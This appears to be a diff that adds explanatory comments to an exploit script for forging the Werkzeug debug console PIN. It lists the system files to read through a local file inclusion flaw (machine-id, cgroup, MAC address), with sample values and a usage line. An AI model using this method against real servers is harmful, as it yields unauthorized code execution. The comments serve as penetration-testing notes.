@@ -1,3 +1,28 @@
+# Python script that will generate a PIN which allows you access to Werkzeug Debug Console /console.
+# For this script to work you will need to find a way to get access to specific files within the system, most likely through a LFI.
+
+# The files of interest are: 
+# --  /etc/machine-id
+#      00566233196142e9961b4ea12a2bdb29
+# --  /proc/self/cgroup
+#        12:perf_event:/
+#        11:freezer:/
+#        10:hugetlb:/
+#        9:pids:/system.slice/blog.service               
+#        8:blkio:/system.slice/blog.service
+#        7:cpu,cpuacct:/system.slice/blog.service
+#        6:net_cls,net_prio:/
+#        5:devices:/system.slice/blog.service
+#        4:cpuset:/
+#        3:rdma:/
+#        2:memory:/system.slice/blog.service
+#        1:name=systemd:/system.slice/blog.service
+#        0::/system.slice/blog.service
+# --  /sys/class/net/INTERFACE_NAME/address 
+#        00:50:56:ba:2b:71
+#        If the MAC address is not present in this file, you might need to search other files such as /sys/class/net/ens160/address.
+#        Once you get the MAC address you need to convert it to a decimal value.
+
 # Usage:
 # python3 exploit.py --machineid '00566233196142e9961b4ea12a2bdb29blog.service' --uuid 345052425073
 #
